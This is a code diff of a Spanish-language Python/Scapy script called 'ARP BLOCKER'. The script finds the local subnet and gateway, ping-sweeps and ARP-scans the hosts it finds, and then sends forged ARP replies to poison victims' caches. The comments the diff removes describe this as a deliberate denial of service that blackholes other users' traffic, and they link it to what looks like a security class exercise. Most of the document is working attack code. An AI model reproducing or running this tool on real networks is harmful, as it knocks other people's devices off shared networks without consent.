@@ -6,59 +6,53 @@ import sys
 import socket
 import subprocess
 import threading
+import ipaddress
 
 INTERVALO = 1.5
 
-def detectar_red():
+def detectar_ip_local():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         mi_ip = s.getsockname()[0]
-        s.close()
     except Exception:
-        print("[!] No se pudo determinar la IP local. Verifica tu conexion.")
-        sys.exit(1)
+        mi_ip = "127.0.0.1"
+    finally:
+        s.close()
+    return mi_ip
 
-    gateway = None
+def detectar_interfaz(mi_ip):
+    for k, v in IFACES.items():
+        if hasattr(v, 'ip') and v.ip == mi_ip:
+            return k
+    return None
+
+def detectar_gateway():
     try:
         resultado = subprocess.check_output("ipconfig", encoding="cp850", errors="ignore")
-        en_adaptador = False
         for linea in resultado.splitlines():
-            if mi_ip in linea:
-                en_adaptador = True
-            if en_adaptador and ("Puerta de enlace" in linea or "Default Gateway" in linea):
-                partes = linea.split(":")
-                if len(partes) > 1:
-                    gw = partes[-1].strip()
-                    if gw and gw != "" and "." in gw:
-                        gateway = gw
-                        break
+            if ("Puerta de enlace" in linea or "Default Gateway" in linea) and ":" in linea:
+                gw = linea.split(":")[-1].strip()
+                if gw and "." in gw:
+                    return gw
     except Exception:
         pass
+    return None
 
-    if not gateway:
+def detectar_red(mi_ip, interfaz):
+    mascara = "255.255.255.0"
+    for iface_name in conf.ifaces:
+        iface = conf.ifaces[iface_name]
+        if getattr(iface, 'ip', None) == mi_ip:
+            mascara = getattr(iface, 'netmask', "255.255.255.0")
+            break
+    
+    try:
+        red = ipaddress.IPv4Interface(f"{mi_ip}/{mascara}").network
+        return str(red)
+    except Exception:
         partes = mi_ip.split(".")
-        gateway = f"{partes[0]}.{partes[1]}.{partes[2]}.1"
-        print(f"[!] No se pudo leer el gateway automaticamente, asumiendo {gateway}")
-
-    partes = mi_ip.split(".")
-    rango = f"{partes[0]}.{partes[1]}.{partes[2]}.0/24"
-
-    interfaz_guid = None
-    for k, v in IFACES.items():
-        try:
-            if hasattr(v, 'ip') and v.ip == mi_ip:
-                interfaz_guid = k
-                nombre = getattr(v, 'name', k)
-                break
-        except Exception:
-            continue
-
-    if not interfaz_guid:
-        print("[!] No se encontro la interfaz con IP", mi_ip)
-        sys.exit(1)
-
-    return interfaz_guid, mi_ip, gateway, rango, nombre
+        return f"{partes[0]}.{partes[1]}.{partes[2]}.0/24"
 
 
 def leer_arp_windows(mi_ip, gateway):
@@ -93,49 +87,40 @@ def leer_arp_windows(mi_ip, gateway):
                     print(f"    [+] {ip}  |  {mac}")
         
         return dispositivos
-    except Exception as e:
+    except Exception:
         return []
 
 
-def forzar_descubrimiento(mi_ip):
-    # #VIPREDARP 1 - Ping Sweep (Reconocimiento)
-    # FASE DE RECONOCIMIENTO: Ping Sweep
-    # Para que el ataque funcione, Windows necesita conocer qué dispositivos están vivos.
-    # Enviamos un "ping" a todas las posibles IPs de la subred para forzarlos a responder
-    # y así guardar sus direcciones MAC en nuestra tabla ARP local.
-    partes = mi_ip.split(".")
-    base = f"{partes[0]}.{partes[1]}.{partes[2]}"
-    print("[*] Forzando descubrimiento de red (Ping Sweep silencioso)...")
+def forzar_descubrimiento(rango):
+    red = ipaddress.IPv4Network(rango)
+    print(f"[*] Iniciando barrido en {rango} ({len(list(red.hosts()))} hosts)...")
     
-    def hacer_ping(ip):
-        try:
-            # 0x08000000 = CREATE_NO_WINDOW evita que salten consolas negras en Windows
-            subprocess.call(["ping", "-n", "1", "-w", "300", ip], 
-                            stdout=subprocess.DEVNULL, 
-                            stderr=subprocess.DEVNULL,
-                            creationflags=0x08000000)
-        except Exception:
-            pass
+    def ping(ip):
+        subprocess.call(["ping", "-n", "1", "-w", "200", ip], 
+                        stdout=subprocess.DEVNULL, 
+                        stderr=subprocess.DEVNULL,
+                        creationflags=0x08000000)
 
-    hilos = []
-    for i in range(1, 255):
-        ip = f"{base}.{i}"
-        t = threading.Thread(target=hacer_ping, args=(ip,))
-        t.daemon = True
+    threads = []
+    hosts = list(red.hosts())
+    if len(hosts) > 1024:
+        print("[!] Red demasiado grande, escaneando solo los primeros 1024 hosts.")
+        hosts = hosts[:1024]
+
+    for host in hosts:
+        t = threading.Thread(target=ping, args=(str(host),))
         t.start()
-        hilos.append(t)
-    
-    # Esperamos unos segundos para que los pings devuelvan respuesta y pueblen la tabla ARP
+        threads.append(t)
+        if len(threads) > 100:
+            for t in threads: t.join()
+            threads = []
+    for t in threads: t.join()
     time.sleep(3.5)
 
 
 def escanear_red(rango, interfaz, mi_ip, gateway):
     print(f"\n[*] Iniciando escaneo en {rango}...")
     
-    # 1. Ejecutar Ping Sweep para despertar la red (vital para Windows)
-    forzar_descubrimiento(mi_ip)
-
-    # 2. Intento de escaneo con Scapy
     paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=rango)
     respondidos, _ = srp(paquete, iface=interfaz, timeout=4, verbose=False)
 
@@ -151,7 +136,6 @@ def escanear_red(rango, interfaz, mi_ip, gateway):
         ips_encontradas.add(ip)
         print(f"    [+] {ip}  |  {mac} (Scapy)")
 
-    # 3. Lectura de la tabla ARP de Windows (El más confiable tras el Ping Sweep)
     print("[*] Combinando con la tabla ARP de Windows...")
     dispositivos_windows = leer_arp_windows(mi_ip, gateway)
     
@@ -164,7 +148,6 @@ def escanear_red(rango, interfaz, mi_ip, gateway):
 
 
 def obtener_mac(ip, interfaz):
-    # 3 intentos de escaneo activo
     for _ in range(3):
         paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
         resp, _ = srp(paquete, iface=interfaz, timeout=5, verbose=False)
@@ -172,7 +155,6 @@ def obtener_mac(ip, interfaz):
             return resp[0][1].hwsrc
         time.sleep(0.5)
     
-    # Fallback: leer de arp -a
     try:
         resultado = subprocess.check_output("arp -a", encoding="cp850", errors="ignore")
         for linea in resultado.splitlines():
@@ -187,12 +169,6 @@ def obtener_mac(ip, interfaz):
 
 
 def spoof(ip_objetivo, mac_objetivo, ip_suplantada, mi_mac, interfaz):
-    # #VIPREDARP 2 - Paquete Forjado (Fallo de Integridad A08)
-    # VULNERABILIDAD CAPA 2: ARP Spoofing como mecanismo de DoS (Denial of Service)
-    # Al inyectar estos paquetes falsos, envenenamos la caché de la víctima.
-    # Dado que NO tenemos activado el reenvío de paquetes (IP Forwarding), 
-    # cuando la víctima nos envía su tráfico, nuestra computadora simplemente lo descarta ("Blackhole").
-    # Esto compromete directamente la 'Disponibilidad' (Availability) de la red.
     paquete = Ether(dst=mac_objetivo) / ARP(
         op    = 2,
         pdst  = ip_objetivo,
@@ -224,22 +200,29 @@ def main():
     print("       ARP BLOCKER — Modo Automatico")
     print("=" * 55)
 
-    interfaz, mi_ip, gateway, rango, nombre_iface = detectar_red()
-    print(f"[+] Interfaz : {nombre_iface}")
-    print(f"[+] Mi IP    : {mi_ip}")
-    print(f"[+] Gateway  : {gateway}")
-    print(f"[+] Rango    : {rango}\n")
+    mi_ip = detectar_ip_local()
+    print(f"[+] Tu IP Local    : {mi_ip}")
+    
+    interfaz = detectar_interfaz(mi_ip)
+    print(f"[+] Interfaz Activa: {interfaz}")
+
+    gateway = detectar_gateway()
+    print(f"[+] Gateway (Router): {gateway}")
+    
+    rango = detectar_red(mi_ip, interfaz)
+    print(f"[+] Rango de Red   : {rango}")
 
     mi_mac = get_if_hwaddr(interfaz)
 
-    print(f"[*] Obteniendo MAC del gateway...")
     mac_gateway = obtener_mac(gateway, interfaz)
     if not mac_gateway:
-        print(f"[!] No se pudo obtener la MAC del gateway ({gateway})")
-        print(f"[!] Verifica que estas conectado a la red.")
+        print("[!] No se pudo obtener la MAC del Gateway. Verifica tu conexión.")
         sys.exit(1)
     print(f"[+] MAC Gateway : {mac_gateway}\n")
 
+    print("[*] Despertando dispositivos en la red...")
+    forzar_descubrimiento(rango)
+    
     dispositivos_encontrados = escanear_red(rango, interfaz, mi_ip, gateway)
 
     print("\n" + "="*55)
